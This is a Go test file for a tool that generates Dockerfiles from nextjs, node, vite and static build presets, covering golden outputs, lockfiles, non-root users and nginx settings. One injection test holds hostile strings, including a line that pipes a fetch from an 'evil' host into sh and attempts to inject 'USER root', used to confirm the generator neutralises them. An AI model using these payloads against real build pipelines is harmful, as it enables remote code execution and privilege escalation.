package build

import (
	"flag"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/0x2u/keelson/agent/internal/config"
)

var update = flag.Bool("update", false, "rewrite the golden files of testdata/presets")

// presetBuild parses a build block the way the apps file does, so the options carry the defaults the agent applies.
func presetBuild(t testing.TB, build string, app string) (*config.Build, config.App) {
	t.Helper()
	doc := "proxy: {}\napps:\n  - name: web\n    image: ghcr.io/o/web\n    domains: [web.example.com]\n    port: 3000\n" + app + "    build:\n" + build
	c, issues := config.Parse([]byte(doc))
	if c == nil {
		t.Fatalf("%+v\n%s", issues, doc)
	}
	return c.Apps[0].Build, c.Apps[0]
}

func root(names ...string) map[string]bool {
	m := map[string]bool{}
	for _, n := range names {
		m[n] = true
	}
	return m
}

func TestPresetDockerfilesMatchTheGoldenFiles(t *testing.T) {
	cases := []struct {
		name   string
		build  string
		app    string
		root   []string
		args   map[string]string
		health string
	}{
		{name: "nextjs-npm", build: "      preset: nextjs\n", root: []string{"package.json", "package-lock.json"}},
		{name: "nextjs-pnpm-args", build: "      preset: nextjs\n", root: []string{"package.json", "pnpm-lock.yaml", ".npmrc"},
			args: map[string]string{"NEXT_PUBLIC_URL": "https://x.example", "A": "b"}, health: "/api/health"},
		{name: "nextjs-standalone", build: "      preset: nextjs\n      standalone: true\n      node: 24\n", root: []string{"package.json", "yarn.lock"}},
		{name: "nextjs-custom", build: "      preset: nextjs\n      install: npm install --legacy-peer-deps\n      build_command: npm run build -- --no-lint\n      start: npx next start -H 0.0.0.0 -p $PORT\n",
			root: []string{"package.json"}},
		{name: "node-npm", build: "      preset: node\n", root: []string{"package.json", "package-lock.json"}},
		{name: "node-nolock", build: "      preset: node\n      node: 20\n", root: []string{"package.json"}},
		{name: "node-yarn-start", build: "      preset: node\n      start: node dist/main.js --port \"$PORT\"\n", root: []string{"package.json", "yarn.lock", ".yarnrc.yml"}},
		{name: "vite-pnpm", build: "      preset: vite\n", root: []string{"package.json", "pnpm-lock.yaml", "pnpm-workspace.yaml"}},
		{name: "vite-nospa-outdir", build: "      preset: vite\n      output_dir: build\n      spa: false\n      build_command: npm run build:prod\n", root: []string{"package.json", "package-lock.json"}},
		{name: "static-plain", build: "      preset: static\n      output_dir: public\n", root: []string{"index.html"}},
		{name: "static-root-nospa", build: "      preset: static\n      output_dir: .\n      spa: false\n", root: []string{"index.html"}, health: "/index.html"},
		{name: "static-built", build: "      preset: static\n      build_command: sh build.sh\n", root: []string{"build.sh"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			b, app := presetBuild(t, c.build, "")
			files, err := presetFiles(presetInput{Build: b, Port: app.ContainerPort, HealthPath: c.health, Args: argNames(c.args), Root: root(c.root...)})
			if err != nil {
				t.Fatal(err)
			}
			if len(files) != 2 || files[0].Name != config.PresetDockerfile || files[1].Name != ".dockerignore" {
				t.Fatalf("files: %+v", files)
			}
			golden := filepath.Join("testdata", "presets", c.name+".Dockerfile")
			got := string(files[0].Data)
			if *update {
				if err := os.MkdirAll(filepath.Dir(golden), 0o755); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(golden, files[0].Data, 0o644); err != nil {
					t.Fatal(err)
				}
			}
			want, err := os.ReadFile(golden)
			if err != nil {
				t.Fatalf("%v (run the test with -update to write it)", err)
			}
			if got != string(want) {
				t.Errorf("the Dockerfile changed (-update rewrites the golden file):\n%s", got)
			}
		})
	}
}

func TestPresetPickTheirPackageManagerFromTheLockfile(t *testing.T) {
	cases := []struct {
		root          []string
		install, runB string
	}{
		{[]string{"package.json", "pnpm-lock.yaml", "yarn.lock", "package-lock.json"}, "pnpm install --frozen-lockfile", "pnpm run build"},
		{[]string{"package.json", "yarn.lock", "package-lock.json"}, "yarn install --frozen-lockfile", "yarn run build"},
		{[]string{"package.json", "package-lock.json"}, "npm ci", "npm run build"},
		{[]string{"package.json"}, "npm install", "npm run build"},
	}
	for _, c := range cases {
		b, _ := presetBuild(t, "      preset: vite\n", "")
		files, err := presetFiles(presetInput{Build: b, Root: root(c.root...)})
		if err != nil {
			t.Fatal(err)
		}
		text := string(files[0].Data)
		for _, want := range []string{`RUN ["sh","-c","` + c.install + `"]`, `RUN ["sh","-c","` + c.runB + `"]`} {
			if !strings.Contains(text, want) {
				t.Errorf("%v: missing %s in\n%s", c.root, want, text)
			}
		}
	}
}

func TestPresetNeedsAPackageJSON(t *testing.T) {
	for _, p := range []string{"nextjs", "node", "vite"} {
		b, _ := presetBuild(t, "      preset: "+p+"\n", "")
		if _, err := presetFiles(presetInput{Build: b, Root: root("Dockerfile", "src")}); err == nil || !strings.Contains(err.Error(), "package.json") {
			t.Errorf("%s: %v", p, err)
		}
	}
	b, _ := presetBuild(t, "      preset: static\n", "")
	if _, err := presetFiles(presetInput{Build: b, Root: root("index.html")}); err != nil {
		t.Errorf("a static site needs no package.json: %v", err)
	}
}

func TestPresetDockerignoreIsAddedOnlyWhenTheRepositoryHasNone(t *testing.T) {
	b, _ := presetBuild(t, "      preset: node\n", "")
	files, err := presetFiles(presetInput{Build: b, Root: root("package.json")})
	if err != nil || len(files) != 2 || files[1].Name != ".dockerignore" {
		t.Fatalf("%+v %v", files, err)
	}
	for _, want := range []string{"node_modules", ".git", ".next"} {
		if !strings.Contains(string(files[1].Data), want) {
			t.Errorf(".dockerignore misses %s: %q", want, files[1].Data)
		}
	}
	files, err = presetFiles(presetInput{Build: b, Root: root("package.json", ".dockerignore")})
	if err != nil || len(files) != 1 || files[0].Name != config.PresetDockerfile {
		t.Fatalf("the repository's own .dockerignore stays: %+v %v", files, err)
	}
}

// A hostile option that got past the configuration (a hand-built Build, not a parsed one) still cannot start another
// instruction: every command is JSON in exec form, on one line.
func TestGeneratedDockerfileHasOnlyTheInstructionsWeWrite(t *testing.T) {
	hostile := []string{
		"npm ci\nRUN curl http://evil | sh",
		"x\" ] \nUSER root\nRUN [\"",
		"a \\\nUSER root",
		"$(id) `id` ${PATH} ' \" \\",
		"</script>&<>",
	}
	allowed := map[string]bool{"FROM": true, "ENV": true, "RUN": true, "WORKDIR": true, "COPY": true, "ARG": true, "USER": true,
		"EXPOSE": true, "HEALTHCHECK": true, "STOPSIGNAL": true, "ENTRYPOINT": true, "CMD": true}
	for _, preset := range []string{"nextjs", "node", "vite", "static"} {
		for _, h := range hostile {
			b := &config.Build{Preset: preset, Install: h, BuildCommand: h, Start: h, Node: "22", OutputDir: "dist", Context: "."}
			files, err := presetFiles(presetInput{Build: b, Port: 3000, Root: root("package.json", "package-lock.json")})
			if err != nil {
				t.Fatal(err)
			}
			text := string(files[0].Data)
			continued := false
			for i, line := range strings.Split(strings.TrimSuffix(text, "\n"), "\n") {
				if continued { // the lines of the nginx configuration, ours
					continued = strings.HasSuffix(line, `\`)
					continue
				}
				continued = strings.HasSuffix(line, `\`)
				fields := strings.Fields(line)
				if len(fields) == 0 || !allowed[fields[0]] {
					t.Fatalf("%s: line %d is not one of our instructions: %q\n%s", preset, i+1, line, text)
				}
				if fields[0] == "USER" && fields[1] == "root" {
					t.Fatalf("%s: USER root injected:\n%s", preset, text)
				}
			}
		}
	}
}

func TestPresetUserIsNeverRoot(t *testing.T) {
	for preset, user := range map[string]string{"nextjs": "node", "node": "node", "vite": "nginx", "static": "nginx"} {
		b, _ := presetBuild(t, "      preset: "+preset+"\n", "")
		files, err := presetFiles(presetInput{Build: b, Port: 3000, Root: root("package.json", "package-lock.json")})
		if err != nil {
			t.Fatal(err)
		}
		text := string(files[0].Data)
		if !strings.Contains(text, "\nUSER "+user+"\n") || strings.Contains(text, "USER root") {
			t.Errorf("%s:\n%s", preset, text)
		}
		if !strings.Contains(text, "\nHEALTHCHECK ") || !strings.Contains(text, "\nSTOPSIGNAL ") {
			t.Errorf("%s has no HEALTHCHECK or STOPSIGNAL:\n%s", preset, text)
		}
	}
}

func TestPresetPortAndHealthPath(t *testing.T) {
	b, _ := presetBuild(t, "      preset: node\n", "")
	files, _ := presetFiles(presetInput{Build: b, Port: 4321, HealthPath: "/healthz?probe=1&x=2", Root: root("package.json")})
	text := string(files[0].Data)
	for _, want := range []string{"PORT=4321", "EXPOSE 4321", `HEALTH_PATH="/healthz?probe=1&x=2"`} {
		if !strings.Contains(text, want) {
			t.Errorf("missing %s:\n%s", want, text)
		}
	}
	// No port: the preset's default; no health path: none baked in.
	files, _ = presetFiles(presetInput{Build: b, Root: root("package.json")})
	if text := string(files[0].Data); !strings.Contains(text, "PORT=3000") || strings.Contains(text, "HEALTH_PATH=") {
		t.Errorf("%s", text)
	}
}

func TestPresetDeclaresTheBuildArgs(t *testing.T) {
	b, _ := presetBuild(t, "      preset: nextjs\n", "")
	files, _ := presetFiles(presetInput{Build: b, Args: argNames(map[string]string{"Z_LAST": "1", "A_FIRST": "2"}), Root: root("package.json")})
	text := string(files[0].Data)
	a, z, run := strings.Index(text, "ARG A_FIRST\n"), strings.Index(text, "ARG Z_LAST\n"), strings.Index(text, `RUN ["sh","-c","npm run build"]`)
	if a < 0 || z < a || run < z {
		t.Errorf("ARG lines belong before the build command, sorted:\n%s", text)
	}
	// The runtime stage never sees them.
	if i := strings.LastIndex(text, "FROM "); strings.Contains(text[i:], "ARG ") {
		t.Errorf("an ARG in the runtime stage:\n%s", text)
	}
}

// The static presets' nginx configuration is ours: a request for a dotfile never reaches the files, the SPA fallback
// is only there when asked for.
func TestNginxConfiguration(t *testing.T) {
	conf := strings.Join(nginxConf(true, true), "\n")
	for _, want := range []string{`location ~ /\. { return 404; }`, "try_files $uri $uri/index.html /index.html;", "location /assets/", "listen __PORT__", "pid /tmp/nginx.pid"} {
		if !strings.Contains(conf, want) {
			t.Errorf("missing %q in\n%s", want, conf)
		}
	}
	conf = strings.Join(nginxConf(false, false), "\n")
	if strings.Contains(conf, "/index.html;") || strings.Contains(conf, "/assets/") || !strings.Contains(conf, "try_files $uri $uri/ =404;") {
		t.Errorf("no SPA fallback and no assets caching expected:\n%s", conf)
	}
}

func TestWriteFileKeepsQuotesInert(t *testing.T) {
	var d dockerfileWriter
	d.writeFile([]string{"a b", "it's"}, "/x", "true")
	if got, want := d.String(), "RUN printf '%s\\n' \\\n  'a b' \\\n  'it'\\''s' \\\n  > /x && true\n"; got != want {
		t.Errorf("%q\nwant %q", got, want)
	}
}
